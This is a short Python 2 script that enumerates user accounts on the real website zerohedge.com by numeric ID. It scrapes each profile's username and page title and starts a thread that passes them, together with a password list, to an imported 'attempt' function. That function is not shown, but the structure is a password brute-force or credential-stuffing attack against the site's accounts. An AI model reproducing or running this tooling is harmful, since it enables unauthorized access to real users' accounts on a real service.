import threading
import urllib2
from attempt import *

def evaluate(number, passwords):
	try:
		request = urllib2.Request("http://www.zerohedge.com/user/" + \
			str(number))
		response = urllib2.urlopen(request).read()
		username = response[response.index("canonical") + \
			48:response.index("revisit-after") - 17]
		title = response[response.index("<title>") + \
			7:response.index(" | Zero Hedge")]
		newThread = threading.Thread(target=attempt,
			args=(number, username, title, passwords))
		newThread.start()
	except Exception as error: pass
